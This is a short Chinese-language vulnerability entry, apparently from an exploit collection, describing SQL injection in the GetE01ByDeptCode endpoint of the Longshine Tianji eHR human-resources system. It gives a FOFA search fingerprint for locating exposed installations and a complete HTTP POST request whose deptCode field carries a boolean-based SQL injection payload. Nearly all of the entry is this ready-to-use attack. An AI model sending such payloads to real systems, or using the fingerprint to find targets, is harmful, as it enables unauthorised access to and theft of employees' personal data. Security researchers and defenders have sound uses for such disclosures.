# 朗新天霁智能eHR人力资源管理系统GetE01ByDeptCode存在SQL注入漏洞

朗新天霁智能eHR人力资源管理系统GetE01ByDeptCode存在SQL注入漏洞，攻击者可获取数据库敏感数据。

## fofa

```java
body="divRememberPwd"
```

## poc

```java
POST /api/Com/GetE01ByDeptCode HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Type: application/json
Connection: close
 
{"deptCode":"1') AND 8104=8104 AND ('UCOF'='UCOF"}
```



## 漏洞来源

- https://mp.weixin.qq.com/s/YukReJJYMHD0tuZyfgcjhg